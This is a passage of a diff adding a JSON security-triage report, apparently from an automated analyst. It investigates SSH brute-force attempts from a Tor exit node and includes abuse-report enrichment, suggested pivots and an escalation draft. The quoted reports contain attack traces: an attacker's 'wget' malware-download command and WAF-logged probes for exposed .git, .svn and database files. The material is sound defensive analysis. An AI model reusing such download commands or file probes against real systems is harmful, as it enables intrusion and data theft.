+              "fromIpCountryName": "Spain"
+            },
+            {
+              "reportedAt": "2026-03-02T11:14:08+00:00",
+              "comment": "Requests denied due to proxy/VPN risk (tenant=82 method=GET path=/browse-by-car-model/volvo.html ua='Mozilla/5.0 (Linux; arm_64; Android 9; CPH1917) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 YaBrowser/20.3.4.98.00 SA/1 Mobile Safari/537.36')",
+              "categories": [
+                9,
+                13
+              ],
+              "reporterId": 242376,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-03-02T00:38:47+00:00",
+              "comment": "ThreatBook Intelligence: tor_proxy,Zombie more details on https://threatbook.io/ip/185.220.101.47\n2026-03-01 23:37:45 /",
+              "categories": [
+                22
+              ],
+              "reporterId": 56171,
+              "fromIpCountryCode": "CN",
+              "fromIpCountryName": "China"
+            },
+            {
+              "reportedAt": "2026-03-01T14:07:52+00:00",
+              "comment": "Try to access /xmlrpc.php",
+              "categories": [
+                21
+              ],
+              "reporterId": 25736,
+              "fromIpCountryCode": "DE",
+              "fromIpCountryName": "Germany"
+            },
+            {
+              "reportedAt": "2026-03-01T03:03:46+00:00",
+              "comment": "Form spam",
+              "categories": [
+                10
+              ],
+              "reporterId": 86372,
+              "fromIpCountryCode": "AU",
+              "fromIpCountryName": "Australia"
+            },
+            {
+              "reportedAt": "2026-02-28T13:24:53+00:00",
+              "comment": "Feb 28 15:24:51 ipht sshd[434788]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.47 \nFeb 28 15:24:51 ipht sshd[434788]: Invalid user kafka from 185.220.101.47 port 23647\nFeb 28 15:24:53 ipht sshd[434788]: Failed password for invalid user kafka from 185.220.101.47 port 23647 ssh2\n...",
+              "categories": [
+                18,
+                22
+              ],
+              "reporterId": 23136,
+              "fromIpCountryCode": "UA",
+              "fromIpCountryName": "Ukraine"
+            },
+            {
+              "reportedAt": "2026-02-27T02:48:59+00:00",
+              "comment": "2026-02-27T02:48:59.489111+00:00 server dovecot: imap-login: Disconnected: Connection closed (no auth attempts in 0 secs): user=, rip=185.220.101.47, lip=X.X.X.X session=",
+              "categories": [
+                14,
+                15
+              ],
+              "reporterId": 72644,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-02-26T14:25:59+00:00",
+              "comment": "Detected Hacking, SQL Injection or general Web App Attack",
+              "categories": [
+                21
+              ],
+              "reporterId": 31924,
+              "fromIpCountryCode": "CZ",
+              "fromIpCountryName": "Czechia"
+            },
+            {
+              "reportedAt": "2026-02-26T10:44:45+00:00",
+              "comment": "2026-02-26 10:44:44 185.220.101.47 Spam word detected.",
+              "categories": [
+                10
+              ],
+              "reporterId": 70637,
+              "fromIpCountryCode": "IE",
+              "fromIpCountryName": "Ireland"
+            },
+            {
+              "reportedAt": "2026-02-26T10:03:08+00:00",
+              "comment": "Blocked by UFW (TCP on 49919)\nSource port: 21379\nTTL: 47\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+              "categories": [
+                14
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-02-24T05:25:28+00:00",
+              "comment": "Blocked by UFW (TCP on 6969)\nSource port: 9131\nTTL: 47\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+              "categories": [
+                14
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-02-24T01:23:50+00:00",
+              "comment": "Malware download/execution attempt - Commands: wget https://meowbot.is.a.pedophile.com",
+              "categories": [
+                15
+              ],
+              "reporterId": 273362,
+              "fromIpCountryCode": "DE",
+              "fromIpCountryName": "Germany"
+            },
+            {
+              "reportedAt": "2026-02-23T12:32:28+00:00",
+              "comment": "Blocked by UFW (TCP on 54407)\nSource port: 24539\nTTL: 47\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+              "categories": [
+                14
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-02-22T20:37:28+00:00",
+              "comment": "Blocked by UFW (TCP on 54407)\nSource port: 20883\nTTL: 47\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+              "categories": [
+                14
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-02-22T14:56:55+00:00",
+              "comment": "(mod_security) mod_security (id:210492) triggered by 185.220.101.47 (tor-exit-47.for-privacy.net): 1 in the last 300 secs; Ports: *; Direction: 1; Trigger: LF_MODSEC; Logs: [Sun Feb 22 09:56:50.061739 2026] [security2:error] [pid 5763:tid 5763] [client 185.220.101.47:37493] ModSecurity: Access denied with code 403 (phase 1). Matched phrase \"/.svn/\" at REQUEST_URI. [file \"/etc/apache2/conf.d/modsec_vendor_configs/comodo_apache/02_Global_Generic.conf\"] [line \"117\"] [id \"210492\"] [rev \"3\"] [severity \"CRITICAL\"] [tag \"CWAF\"] [tag \"Generic\"] [hostname \"cityindustries.com\"] [uri \"/.svn/entries\"] [unique_id \"aZsZMnAUvm9thrxRm_SITwAAAAU\"]",
+              "categories": [
+                18,
+                19,
+                21
+              ],
+              "reporterId": 56941,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-02-22T01:16:12+00:00",
+              "comment": "(mod_security) mod_security (id:210730) triggered by 185.220.101.47 (tor-exit-47.for-privacy.net): 1 in the last 300 secs; Ports: *; Direction: 1; Trigger: LF_MODSEC; Logs: [Sat Feb 21 20:16:07.013152 2026] [security2:error] [pid 24565:tid 24590] [client 185.220.101.47:43825] ModSecurity: Access denied with code 403 (phase 2). Match of \"pmFromFile userdata_wl_extensions\" against \"TX:extension\" required. [file \"/etc/apache2/conf.d/modsec_vendor_configs/comodo_apache/10_HTTP_HTTP.conf\"] [line \"27\"] [id \"210730\"] [rev \"5\"] [msg \"COMODO WAF: URL file extension is restricted by policy||www.adultbaja.com|F|2\"] [data \".sql\"] [severity \"CRITICAL\"] [tag \"CWAF\"] [tag \"HTTP\"] [hostname \"www.adultbaja.com\"] [uri \"/database.sql\"] [unique_id \"aZpY1ylAArhkzYd4hjb2IgAAANI\"]",
+              "categories": [
+                18,
+                19,
+                21
+              ],
+              "reporterId": 56941,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-02-20T21:38:32+00:00",
+              "comment": "Form spam",
+              "categories": [
+                10
+              ],
+              "reporterId": 86372,
+              "fromIpCountryCode": "AU",
+              "fromIpCountryName": "Australia"
+            },
+            {
+              "reportedAt": "2026-02-19T15:08:28+00:00",
+              "comment": "Blocked by UFW (TCP on 45340)\nSource port: 52223\nTTL: 47\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+              "categories": [
+                14
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-02-15T14:53:11+00:00",
+              "comment": "Form spam",
+              "categories": [
+                10
+              ],
+              "reporterId": 86372,
+              "fromIpCountryCode": "AU",
+              "fromIpCountryName": "Australia"
+            },
+            {
+              "reportedAt": "2026-02-13T20:06:19+00:00",
+              "comment": "[SMB remote code execution attempt: port tcp/445] from Tor node 185.220.101.47",
+              "categories": [
+                14,
+                15,
+                18,
+                11,
+                10,
+                21
+              ],
+              "reporterId": 198442,
+              "fromIpCountryCode": "BG",
+              "fromIpCountryName": "Bulgaria"
+            },
+            {
+              "reportedAt": "2026-02-13T12:49:22+00:00",
+              "comment": "(wordpress) Failed wordpress login using wp-login.php or xmlrpc.php",
+              "categories": [
+                21
+              ],
+              "reporterId": 134687,
+              "fromIpCountryCode": "DE",
+              "fromIpCountryName": "Germany"
+            },
+            {
+              "reportedAt": "2026-02-13T05:14:48+00:00",
+              "comment": "Blocked by UFW (TCP on 46947)\nSource port: 41473\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+              "categories": [
+                14
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-02-12T06:02:48+00:00",
+              "comment": "Blocked by UFW (TCP on 35967)\nSource port: 54627\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+              "categories": [
+                14
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-02-11T15:54:02+00:00",
+              "comment": "Form spam",
+              "categories": [
+                10
+              ],
+              "reporterId": 86372,
+              "fromIpCountryCode": "AU",
+              "fromIpCountryName": "Australia"
+            },
+            {
+              "reportedAt": "2026-02-10T00:09:51+00:00",
+              "comment": "(mod_security) mod_security (id:210492) triggered by 185.220.101.47 (tor-exit-47.for-privacy.net): 1 in the last 300 secs; Ports: *; Direction: 1; Trigger: LF_MODSEC; Logs: [Mon Feb 09 19:09:43.101014 2026] [security2:error] [pid 28084:tid 28084] [client 185.220.101.47:14661] ModSecurity: Access denied with code 403 (phase 1). Matched phrase \"/.git/\" at REQUEST_URI. [file \"/etc/apache2/conf.d/modsec_vendor_configs/comodo_apache/02_Global_Generic.conf\"] [line \"117\"] [id \"210492\"] [rev \"3\"] [severity \"CRITICAL\"] [tag \"CWAF\"] [tag \"Generic\"] [hostname \"deanandolsek.com\"] [uri \"/.git/config\"] [unique_id \"aYp3R_wgQKszUj2_y-FK-wAAAAo\"]",
+              "categories": [
+                18,
+                19,
+                21
+              ],
+              "reporterId": 56941,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-02-07T22:13:53+00:00",
+              "comment": "Try to access /xmlrpc.php",
+              "categories": [
+                21
+              ],
+              "reporterId": 25736,
+              "fromIpCountryCode": "DE",
+              "fromIpCountryName": "Germany"
+            },
+            {
+              "reportedAt": "2026-02-07T13:12:08+00:00",
+              "comment": "Blocked by UFW (TCP on 12941)\nSource port: 57065\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+              "categories": [
+                14
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-02-06T00:14:32+00:00",
+              "comment": "ThreatBook Intelligence: tor_proxy,Zombie more details on https://threatbook.io/ip/185.220.101.47\n2026-02-05 04:00:39 /",
+              "categories": [
+                21
+              ],
+              "reporterId": 56171,
+              "fromIpCountryCode": "CN",
+              "fromIpCountryName": "China"
+            },
+            {
+              "reportedAt": "2026-02-04T13:27:25+00:00",
+              "comment": "Unidentified crawling: not a self-announced bot in user-agent",
+              "categories": [
+                19
+              ],
+              "reporterId": 26072,
+              "fromIpCountryCode": "FR",
+              "fromIpCountryName": "France"
+            },
+            {
+              "reportedAt": "2026-02-03T03:00:34+00:00",
+              "comment": "VM5 Bad user agents ignoring web crawling rules. Draing bandwidth",
+              "categories": [
+                4,
+                19
+              ],
+              "reporterId": 95575,
+              "fromIpCountryCode": "AU",
+              "fromIpCountryName": "Australia"
+            },
+            {
+              "reportedAt": "2026-02-03T00:53:00+00:00",
+              "comment": "ThreatBook Intelligence: tor_proxy,Zombie more details on https://threatbook.io/ip/185.220.101.47",
+              "categories": [
+                22
+              ],
+              "reporterId": 56171,
+              "fromIpCountryCode": "CN",
+              "fromIpCountryName": "China"
+            },
+            {
+              "reportedAt": "2026-02-01T20:02:08+00:00",
+              "comment": "Blocked by UFW (TCP on 6881)\nSource port: 21403\nTTL: 47\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+              "categories": [
+                14
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-01-31T16:20:07+00:00",
+              "comment": "Form spam (honeypot): POST /launch-notification",
+              "categories": [
+                10
+              ],
+              "reporterId": 139729,
+              "fromIpCountryCode": "NL",
+              "fromIpCountryName": "Netherlands"
+            },
+            {
+              "reportedAt": "2026-01-28T18:46:08+00:00",
+              "comment": "Blocked by UFW (TCP on 15440)\nSource port: 12259\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+              "categories": [
+                14
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-01-28T01:03:06+00:00",
+              "comment": "ThreatBook Intelligence: tor_proxy,Zombie more details on https://threatbook.io/ip/185.220.101.47",
+              "categories": [
+                22
+              ],
+              "reporterId": 56171,
+              "fromIpCountryCode": "CN",
+              "fromIpCountryName": "China"
+            },
+            {
+              "reportedAt": "2026-01-27T05:51:32+00:00",
+              "comment": "Honeypot [uk-production01]: Unauthorized traffic (314 bytes of payload); 7443 [1] TCP",
+              "categories": [
+                14
+              ],
+              "reporterId": 167826,
+              "fromIpCountryCode": "GB",
+              "fromIpCountryName": "United Kingdom of Great Britain and Northern Ireland"
+            },
+            {
+              "reportedAt": "2026-01-26T16:30:08+00:00",
+              "comment": "Failed login attempt detected by Fail2Ban in plesk-postfix jail",
+              "categories": [
+                18
+              ],
+              "reporterId": 153522,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-01-24T13:05:18+00:00",
+              "comment": "Repeated requests on blocked xmlrpc.php, blocked by fail2ban in custom-503-xmlrpc jail",
+              "categories": [
+                19,
+                21
+              ],
+              "reporterId": 169612,
+              "fromIpCountryCode": "DE",
+              "fromIpCountryName": "Germany"
+            },
+            {
+              "reportedAt": "2026-01-24T08:25:47+00:00",
+              "comment": "Jan 24 08:25:43 s695 sshd[53402]: Failed password for root from 185.220.101.47 port 20365 ssh2\nJan 24 08:25:45 s695 sshd[53409]: Invalid user admin from 185.220.101.47 port 20409\nJan 24 08:25:46 s695 sshd[53402]: Failed password for root from 185.220.101.47 port 20365 ssh2\n...",
+              "categories": [
+                18,
+                22
+              ],
+              "reporterId": 255013,
+              "fromIpCountryCode": "NL",
+              "fromIpCountryName": "Netherlands"
+            },
+            {
+              "reportedAt": "2026-01-24T06:01:06+00:00",
+              "comment": "Form spam",
+              "categories": [
+                10
+              ],
+              "reporterId": 86372,
+              "fromIpCountryCode": "AU",
+              "fromIpCountryName": "Australia"
+            },
+            {
+              "reportedAt": "2026-01-23T04:35:22+00:00",
+              "comment": "Repeated requests on blocked xmlrpc.php, blocked by fail2ban in custom-503-xmlrpc jail",
+              "categories": [
+                19,
+                21
+              ],
+              "reporterId": 169612,
+              "fromIpCountryCode": "DE",
+              "fromIpCountryName": "Germany"
+            },
+            {
+              "reportedAt": "2026-01-22T23:54:53+00:00",
+              "comment": "2026-01-22T23:54:47.584291+00:00 Linux15 sshd-session[1209360]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.47\n2026-01-22T23:54:49.840594+00:00 Linux15 sshd-session[1209360]: Failed password for invalid user packer from 185.220.101.47 port 32593 ssh2\n2026-01-22T23:54:48.202203+00:00 Linux15 sshd-session[1209383]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.47\n2026-01-22T23:54:49.861602+00:00 Linux15 sshd-session[1209383]: Failed password for invalid user panel from 185.220.101.47 port 32601 ssh2\n2026-01-22T23:54:48.619962+00:00 Linux15 sshd-session[1209399]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.47\n2026-01-22T23:54:50.469607+00:00 Linux15 sshd-session[1209399]: Failed password for invalid user owncloud from 185.220.101.47 port 32609 ssh2\n2026-01-22T23:54:49.552351+00:00 Linux15 sshd-session[1209435]: pam_unix(sshd:\n...",
+              "categories": [
+                18,
+                22
+              ],
+              "reporterId": 60158,
+              "fromIpCountryCode": "FI",
+              "fromIpCountryName": "Finland"
+            }
+          ]
+        },
+        "confidence": "high"
+      }
+    ],
+    "suggested_pivots": [
+      {
+        "action": "Verify no successful authentication occurred on prod-web-02.internal from 185.220.101.47 during the attack window (2026-04-19T03:11:22Z to 2026-04-19T03:14:22Z)",
+        "rationale": "Alert shows only failed attempts. Confirm no account compromise before closing investigation.",
+        "priority": "high"
+      },
+      {
+        "action": "Check if any other internal systems received SSH connection attempts from this IP in the same timeframe",
+        "rationale": "Lateral targeting suggests broader reconnaissance; need to assess full scope of exposure.",
+        "priority": "high"
+      },
+      {
+        "action": "Review SSH service configuration on prod-web-02.internal for hardening gaps (e.g., key-based auth enforcement, rate limiting, fail2ban rules)",
+        "rationale": "Prevent similar attacks from succeeding if attacker returns or uses different Tor exit nodes.",
+        "priority": "medium"
+      },
+      {
+        "action": "Cross-reference the usernames attempted (root, admin, ubuntu, oracle, postgres, git) against active accounts on prod-web-02.internal",
+        "rationale": "Establish whether attack targeted real accounts, increasing risk of successful breach.",
+        "priority": "medium"
+      },
+      {
+        "action": "Investigate if this Tor node (185.220.101.47 / tor-exit-47.for-privacy.net) should be added to a network-wide SSH blocklist",
+        "rationale": "Given 92 historical abuse reports including multiple SSH brute-force incidents, blocking at egress/ingress may reduce recurrence.",
+        "priority": "medium"
+      }
+    ],
+    "escalation_recommended": true,
+    "escalation_draft": "ESCALATION ALERT: Confirmed credential brute-force attack against production web server (prod-web-02.internal) from known malicious Tor exit node 185.220.101.47. Attack parameters: 847 failed SSH authentications over 180 seconds targeting 6 common usernames. IP reputation score 100/100 (92 prior abuse reports). No successful authentications detected, but hardening review and account audit recommended. Advise blocking IP at perimeter if not already in place. Verify no lateral movement occurred within infrastructure.",
+    "reasoning_transcript": "Starting investigation of alert ALRT-2026-0419-001. Alert reports 847 failed SSH authentications from single source 185.220.101.47 to prod-web-02.internal over 180 seconds, targeting usernames: root, admin, ubuntu, oracle, postgres, git. Severity marked high. \n\nEvidence from IP reputation check confirms 185.220.101.47 is a Tor exit node (tor-exit-47.for-privacy.net, isp='Network for Tor-Exit traffic') with abuse confidence score 100/100 and 92 historical abuse reports from diverse geographic reporters. Critical finding: enrichment data contains 92 abuse reports spanning January 2026 through April 2026, with at least 7 prior reports specifically citing SSH brute-force or credential attack activity against other systems. Examples: 2026-04-18 'Unsolicited Connection Attempt', 2026-04-18 'brute force and password spray attack', 2026-03-11 'SSH Bruteforce attempt', 2026-01-24 sshd logs showing failed password attempts for root and admin users. This pattern is directly consistent with the current alert. \n\nNo tool available to query authentication success/failure detail beyond what is in the alert, but alert explicitly states 'failed_attempts: 847' with no mention of successful authentications, which is strong evidence that all attempts were rejected by SSH authentication control. \n\nMITRE mapping: Attack demonstrates T1110.001 (Brute Force: Password Guessing) and/or T1110.003 (Brute Force: Password Spraying) - targeting multiple common usernames in rapid succession is consistent with password-spray, a variant of brute force. The usernames (root, admin) suggest dictionary-based targeting of privileged accounts. \n\nConfidence assessment: High. Evidence is direct from alert (847 failed attempts, usernames, source IP, timing) and strongly corroborated by IP reputation (100/100 abuse score, Tor exit node, 92 prior reports including SSH attacks). No contradictory evidence. No indication of false positive - this is classic brute-force attack activity from a confirmed malicious infrastructure node. \n\nEscalation warranted because: (1) attack targeted production system (prod-web-02), (2) high-volume credential attack indicates potential privilege escalation intent if successful, (3) IP reputation and TTP history confirm threat actor or automated attack tool, (4) multiple MITRE techniques chain together (Brute Force \u2192 Credential Access if successful), (5) although attack failed here, lack of hardening review creates risk for next attack from different Tor exit node."
+  }
+}
